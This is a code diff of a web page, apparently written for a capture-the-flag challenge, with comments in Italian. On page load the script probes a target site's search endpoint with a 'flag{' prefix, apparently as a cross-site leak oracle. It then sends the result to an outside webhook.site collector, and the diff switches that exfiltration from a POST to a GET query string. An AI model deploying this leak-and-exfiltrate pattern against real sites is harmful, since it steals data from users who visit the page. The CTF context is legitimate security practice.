@@ -38,7 +38,7 @@
 
         // Funzione da chiamare al caricamento della pagina
         const testResourceLeak = async () => {
-            const url = 'https://matrix.capturetheflags.site/search?s=ajsajnONSNDsadOSNonsA'; // Sostituisci con l'URL da testare
+            const url = 'https://matrix.capturetheflags.site/search?s=flag{'; // Sostituisci con l'URL da testare
             const result = await leak(url);
             const resultDiv = document.getElementById('result');
 
@@ -51,33 +51,29 @@
                 message = 'Risorsa non accessibile';
             }
 
-            // Invia il log al server Flask
+            // Invia il log al server Webhook utilizzando GET
             await logResult(message);
         };
 
-        // Funzione per inviare i log al server Flask
+        // Funzione per inviare i log al Webhook
         const logResult = async (message) => {
-        const ngrokUrl = 'https://webhook.site/d1c2d4d1-02cc-4007-bf6c-1d3cc3528bad'; // Sostituisci con il tuo URL Ngrok
-        try {
-            const response = await fetch(`${ngrokUrl}/log`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({ message }),
-            });
+            const webhookUrl = 'https://webhook.site/d1c2d4d1-02cc-4007-bf6c-1d3cc3528bad'; // Sostituisci con il tuo URL di Webhook.site
+            try {
+                // Costruisci l'URL con il messaggio come parametro
+                const urlWithParams = `${webhookUrl}?message=${encodeURIComponent(message)}`;
+                const response = await fetch(urlWithParams, {
+                    method: 'GET', // Cambiato a GET
+                });
 
-            if (!response.ok) {
-                console.error('Errore durante l\'invio del log:', response.statusText);
-            } else {
-                console.log('Log inviato con successo');
+                if (!response.ok) {
+                    console.error('Errore durante l\'invio del log:', response.statusText);
+                } else {
+                    console.log('Log inviato con successo');
+                }
+            } catch (error) {
+                console.error('Errore di rete:', error);
             }
-        } catch (error) {
-            console.error('Errore di rete:', error);
-        }
-    };
-
-
+        };
 
         // Esegui il test al caricamento del DOM
         document.addEventListener('DOMContentLoaded', testResourceLeak);
